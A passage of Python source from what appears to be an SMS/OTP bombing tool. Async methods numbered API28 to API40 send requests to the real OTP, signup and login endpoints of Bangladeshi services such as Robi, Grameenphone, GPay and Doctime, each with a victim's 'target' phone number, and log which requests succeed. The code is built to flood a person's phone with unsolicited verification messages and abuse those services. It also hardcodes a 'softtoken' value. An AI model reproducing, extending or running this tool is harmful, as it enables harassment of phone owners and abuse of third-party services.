            await self.log_event("API27 - Wafilife OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api28_robi_account_otp(self):
        target = self.target
        url = "https://webapi.robi.com.bd/v1/account/register/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API28 - Robi Account OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API28 - Robi Account OTP": pass
            elif "Bioscope" in "API28 - Robi Account OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API28 - Robi Account OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API28 - Robi Account OTP": payload = {"phone": target}
            elif "Medha" in "API28 - Robi Account OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API28 - Robi Account OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API28 - Robi Account OTP": payload = {"phone_number": target}
            elif "Arogga" in "API28 - Robi Account OTP": payload = {"mobile": target}
            elif "MyGP" in "API28 - Robi Account OTP": pass
            elif "BDSTall" in "API28 - Robi Account OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API28 - Robi Account OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API28 - Robi Account OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API28 - Robi Account OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API28 - Robi Account OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API28 - Robi Account OTP": payload = {"mobile": target}
            elif "Kirei" in "API28 - Robi Account OTP": payload = {"phone": target}
            elif "Shikho" in "API28 - Robi Account OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API28 - Robi Account OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API28 - Robi Account OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API28 - Robi Account OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API28 - Robi Account OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api29_chardike_otp(self):
        target = self.target
        url = "https://api.chardike.com/api/chardike-login-need"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API29 - Chardike OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API29 - Chardike OTP": pass
            elif "Bioscope" in "API29 - Chardike OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API29 - Chardike OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API29 - Chardike OTP": payload = {"phone": target}
            elif "Medha" in "API29 - Chardike OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API29 - Chardike OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API29 - Chardike OTP": payload = {"phone_number": target}
            elif "Arogga" in "API29 - Chardike OTP": payload = {"mobile": target}
            elif "MyGP" in "API29 - Chardike OTP": pass
            elif "BDSTall" in "API29 - Chardike OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API29 - Chardike OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API29 - Chardike OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API29 - Chardike OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API29 - Chardike OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API29 - Chardike OTP": payload = {"mobile": target}
            elif "Kirei" in "API29 - Chardike OTP": payload = {"phone": target}
            elif "Shikho" in "API29 - Chardike OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API29 - Chardike OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API29 - Chardike OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API29 - Chardike OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API29 - Chardike OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api30_e_testpaper_otp(self):
        target = self.target
        url = "https://dev.etestpaper.net/api/v4/auth/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API30 - E-TestPaper OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API30 - E-TestPaper OTP": pass
            elif "Bioscope" in "API30 - E-TestPaper OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API30 - E-TestPaper OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API30 - E-TestPaper OTP": payload = {"phone": target}
            elif "Medha" in "API30 - E-TestPaper OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API30 - E-TestPaper OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API30 - E-TestPaper OTP": payload = {"phone_number": target}
            elif "Arogga" in "API30 - E-TestPaper OTP": payload = {"mobile": target}
            elif "MyGP" in "API30 - E-TestPaper OTP": pass
            elif "BDSTall" in "API30 - E-TestPaper OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API30 - E-TestPaper OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API30 - E-TestPaper OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API30 - E-TestPaper OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API30 - E-TestPaper OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API30 - E-TestPaper OTP": payload = {"mobile": target}
            elif "Kirei" in "API30 - E-TestPaper OTP": payload = {"phone": target}
            elif "Shikho" in "API30 - E-TestPaper OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API30 - E-TestPaper OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API30 - E-TestPaper OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API30 - E-TestPaper OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API30 - E-TestPaper OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api31_gpay_signup(self):
        target = self.target
        url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API31 - GPay Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API31 - GPay Signup": pass
            elif "Bioscope" in "API31 - GPay Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API31 - GPay Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API31 - GPay Signup": payload = {"phone": target}
            elif "Medha" in "API31 - GPay Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API31 - GPay Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API31 - GPay Signup": payload = {"phone_number": target}
            elif "Arogga" in "API31 - GPay Signup": payload = {"mobile": target}
            elif "MyGP" in "API31 - GPay Signup": pass
            elif "BDSTall" in "API31 - GPay Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API31 - GPay Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API31 - GPay Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API31 - GPay Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API31 - GPay Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API31 - GPay Signup": payload = {"mobile": target}
            elif "Kirei" in "API31 - GPay Signup": payload = {"phone": target}
            elif "Shikho" in "API31 - GPay Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API31 - GPay Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API31 - GPay Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API31 - GPay Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API31 - GPay Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api32_applink_otp(self):
        target = self.target
        url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API32 - Applink OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API32 - Applink OTP": pass
            elif "Bioscope" in "API32 - Applink OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API32 - Applink OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API32 - Applink OTP": payload = {"phone": target}
            elif "Medha" in "API32 - Applink OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API32 - Applink OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API32 - Applink OTP": payload = {"phone_number": target}
            elif "Arogga" in "API32 - Applink OTP": payload = {"mobile": target}
            elif "MyGP" in "API32 - Applink OTP": pass
            elif "BDSTall" in "API32 - Applink OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API32 - Applink OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API32 - Applink OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API32 - Applink OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API32 - Applink OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API32 - Applink OTP": payload = {"mobile": target}
            elif "Kirei" in "API32 - Applink OTP": payload = {"phone": target}
            elif "Shikho" in "API32 - Applink OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API32 - Applink OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API32 - Applink OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API32 - Applink OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API32 - Applink OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api33_priyoshikkhaloy(self):
        target = self.target
        url = "https://app.priyoshikkhaloy.com/api/user/register-login.php"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API33 - Priyoshikkhaloy": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API33 - Priyoshikkhaloy": pass
            elif "Bioscope" in "API33 - Priyoshikkhaloy": payload = {"number": "+88" + target}
            elif "Proiojon" in "API33 - Priyoshikkhaloy": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API33 - Priyoshikkhaloy": payload = {"phone": target}
            elif "Medha" in "API33 - Priyoshikkhaloy": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API33 - Priyoshikkhaloy": payload = {"number": "+88" + target}
            elif "Robi" in "API33 - Priyoshikkhaloy": payload = {"phone_number": target}
            elif "Arogga" in "API33 - Priyoshikkhaloy": payload = {"mobile": target}
            elif "MyGP" in "API33 - Priyoshikkhaloy": pass
            elif "BDSTall" in "API33 - Priyoshikkhaloy": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API33 - Priyoshikkhaloy": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API33 - Priyoshikkhaloy": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API33 - Priyoshikkhaloy": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API33 - Priyoshikkhaloy": payload = {"phoneNumber": target}
            elif "Sindabad" in "API33 - Priyoshikkhaloy": payload = {"mobile": target}
            elif "Kirei" in "API33 - Priyoshikkhaloy": payload = {"phone": target}
            elif "Shikho" in "API33 - Priyoshikkhaloy": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API33 - Priyoshikkhaloy": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API33 - Priyoshikkhaloy", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API33 - Priyoshikkhaloy", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API33 - Priyoshikkhaloy", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api34_kabbik_otp(self):
        target = self.target
        url = "https://api.kabbik.com/v1/auth/otpnew"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API34 - Kabbik OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API34 - Kabbik OTP": pass
            elif "Bioscope" in "API34 - Kabbik OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API34 - Kabbik OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API34 - Kabbik OTP": payload = {"phone": target}
            elif "Medha" in "API34 - Kabbik OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API34 - Kabbik OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API34 - Kabbik OTP": payload = {"phone_number": target}
            elif "Arogga" in "API34 - Kabbik OTP": payload = {"mobile": target}
            elif "MyGP" in "API34 - Kabbik OTP": pass
            elif "BDSTall" in "API34 - Kabbik OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API34 - Kabbik OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API34 - Kabbik OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API34 - Kabbik OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API34 - Kabbik OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API34 - Kabbik OTP": payload = {"mobile": target}
            elif "Kirei" in "API34 - Kabbik OTP": payload = {"phone": target}
            elif "Shikho" in "API34 - Kabbik OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API34 - Kabbik OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API34 - Kabbik OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API34 - Kabbik OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API34 - Kabbik OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api35_salextra(self):
        target = self.target
        url = "https://salextra.com.bd/customer/checkusernameavailabilityonregistration"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API35 - Salextra": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API35 - Salextra": pass
            elif "Bioscope" in "API35 - Salextra": payload = {"number": "+88" + target}
            elif "Proiojon" in "API35 - Salextra": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API35 - Salextra": payload = {"phone": target}
            elif "Medha" in "API35 - Salextra": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API35 - Salextra": payload = {"number": "+88" + target}
            elif "Robi" in "API35 - Salextra": payload = {"phone_number": target}
            elif "Arogga" in "API35 - Salextra": payload = {"mobile": target}
            elif "MyGP" in "API35 - Salextra": pass
            elif "BDSTall" in "API35 - Salextra": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API35 - Salextra": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API35 - Salextra": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API35 - Salextra": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API35 - Salextra": payload = {"phoneNumber": target}
            elif "Sindabad" in "API35 - Salextra": payload = {"mobile": target}
            elif "Kirei" in "API35 - Salextra": payload = {"phone": target}
            elif "Shikho" in "API35 - Salextra": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API35 - Salextra": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API35 - Salextra", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API35 - Salextra", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API35 - Salextra", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api36_sundora(self):
        target = self.target
        url = "https://api.sundora.com.bd/api/user/customer/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API36 - Sundora": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API36 - Sundora": pass
            elif "Bioscope" in "API36 - Sundora": payload = {"number": "+88" + target}
            elif "Proiojon" in "API36 - Sundora": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API36 - Sundora": payload = {"phone": target}
            elif "Medha" in "API36 - Sundora": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API36 - Sundora": payload = {"number": "+88" + target}
            elif "Robi" in "API36 - Sundora": payload = {"phone_number": target}
            elif "Arogga" in "API36 - Sundora": payload = {"mobile": target}
            elif "MyGP" in "API36 - Sundora": pass
            elif "BDSTall" in "API36 - Sundora": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API36 - Sundora": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API36 - Sundora": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API36 - Sundora": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API36 - Sundora": payload = {"phoneNumber": target}
            elif "Sindabad" in "API36 - Sundora": payload = {"mobile": target}
            elif "Kirei" in "API36 - Sundora": payload = {"phone": target}
            elif "Shikho" in "API36 - Sundora": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API36 - Sundora": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API36 - Sundora", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API36 - Sundora", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API36 - Sundora", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api37_mygp_cinematic(self):
        target = self.target
        url = "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API37 - MyGP Cinematic": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API37 - MyGP Cinematic": pass
            elif "Bioscope" in "API37 - MyGP Cinematic": payload = {"number": "+88" + target}
            elif "Proiojon" in "API37 - MyGP Cinematic": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API37 - MyGP Cinematic": payload = {"phone": target}
            elif "Medha" in "API37 - MyGP Cinematic": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API37 - MyGP Cinematic": payload = {"number": "+88" + target}
            elif "Robi" in "API37 - MyGP Cinematic": payload = {"phone_number": target}
            elif "Arogga" in "API37 - MyGP Cinematic": payload = {"mobile": target}
            elif "MyGP" in "API37 - MyGP Cinematic": pass
            elif "BDSTall" in "API37 - MyGP Cinematic": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API37 - MyGP Cinematic": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API37 - MyGP Cinematic": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API37 - MyGP Cinematic": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API37 - MyGP Cinematic": payload = {"phoneNumber": target}
            elif "Sindabad" in "API37 - MyGP Cinematic": payload = {"mobile": target}
            elif "Kirei" in "API37 - MyGP Cinematic": payload = {"phone": target}
            elif "Shikho" in "API37 - MyGP Cinematic": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API37 - MyGP Cinematic": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API37 - MyGP Cinematic", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API37 - MyGP Cinematic", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API37 - MyGP Cinematic", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api38_bajistar(self):
        target = self.target
        url = "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API38 - Bajistar": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API38 - Bajistar": pass
            elif "Bioscope" in "API38 - Bajistar": payload = {"number": "+88" + target}
            elif "Proiojon" in "API38 - Bajistar": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API38 - Bajistar": payload = {"phone": target}
            elif "Medha" in "API38 - Bajistar": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API38 - Bajistar": payload = {"number": "+88" + target}
            elif "Robi" in "API38 - Bajistar": payload = {"phone_number": target}
            elif "Arogga" in "API38 - Bajistar": payload = {"mobile": target}
            elif "MyGP" in "API38 - Bajistar": pass
            elif "BDSTall" in "API38 - Bajistar": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API38 - Bajistar": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API38 - Bajistar": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API38 - Bajistar": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API38 - Bajistar": payload = {"phoneNumber": target}
            elif "Sindabad" in "API38 - Bajistar": payload = {"mobile": target}
            elif "Kirei" in "API38 - Bajistar": payload = {"phone": target}
            elif "Shikho" in "API38 - Bajistar": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API38 - Bajistar": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API38 - Bajistar", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API38 - Bajistar", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API38 - Bajistar", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api39_doctime(self):
        target = self.target
        url = "https://api.doctime.com.bd/api/authenticate"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API39 - Doctime": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API39 - Doctime": pass
            elif "Bioscope" in "API39 - Doctime": payload = {"number": "+88" + target}
            elif "Proiojon" in "API39 - Doctime": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API39 - Doctime": payload = {"phone": target}
            elif "Medha" in "API39 - Doctime": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API39 - Doctime": payload = {"number": "+88" + target}
            elif "Robi" in "API39 - Doctime": payload = {"phone_number": target}
            elif "Arogga" in "API39 - Doctime": payload = {"mobile": target}
            elif "MyGP" in "API39 - Doctime": pass
            elif "BDSTall" in "API39 - Doctime": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API39 - Doctime": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API39 - Doctime": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API39 - Doctime": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API39 - Doctime": payload = {"phoneNumber": target}
            elif "Sindabad" in "API39 - Doctime": payload = {"mobile": target}
            elif "Kirei" in "API39 - Doctime": payload = {"phone": target}
            elif "Shikho" in "API39 - Doctime": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API39 - Doctime": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API39 - Doctime", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API39 - Doctime", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API39 - Doctime", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api40_grameenphone_fi(self):
        target = self.target
        url = "https://webloginda.grameenphone.com/backend/api/v1/otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API40 - Grameenphone FI": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API40 - Grameenphone FI": pass
            elif "Bioscope" in "API40 - Grameenphone FI": payload = {"number": "+88" + target}
            elif "Proiojon" in "API40 - Grameenphone FI": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API40 - Grameenphone FI": payload = {"phone": target}
            elif "Medha" in "API40 - Grameenphone FI": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API40 - Grameenphone FI": payload = {"number": "+88" + target}
            elif "Robi" in "API40 - Grameenphone FI": payload = {"phone_number": target}
